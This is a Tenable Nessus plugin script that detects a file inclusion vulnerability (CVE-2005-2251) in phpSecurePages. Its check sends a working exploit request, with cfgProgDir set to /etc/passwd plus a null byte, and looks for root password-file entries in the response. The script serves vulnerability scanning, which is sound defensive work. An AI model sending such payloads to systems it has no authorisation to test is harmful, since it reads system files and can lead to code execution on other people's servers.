#
# (C) Tenable Network Security
#



include("compat.inc");

if (description) {
  script_id(18659);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2251");
  script_bugtraq_id(14201);
  script_xref(name:"OSVDB", value:"17783");

  name["english"] = "phpSecurePages cfgProgDir Variable File Include Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains several PHP scripts that may allow
arbitrary code execution and local file disclosure." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpSecurePages, a PHP module used to secure
pages with a login name / password. 

The installed version of phpSecurePages allows remote attackers to
control the 'cfgProgDir' variable used when including PHP code in
several of the application's scripts.  By leveraging this flaw, an
attacker may be able to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/advisories/15994/" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for cfgProgDir variable file include vulnerabilities in phpSecurePages";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/secure.php?",
      "cfgProgDir=/etc/passwd%00" ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled; passing 
    #     remote URLs might still work though.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream")
  ) {
    security_hole(port);
    exit(0);
  }
}
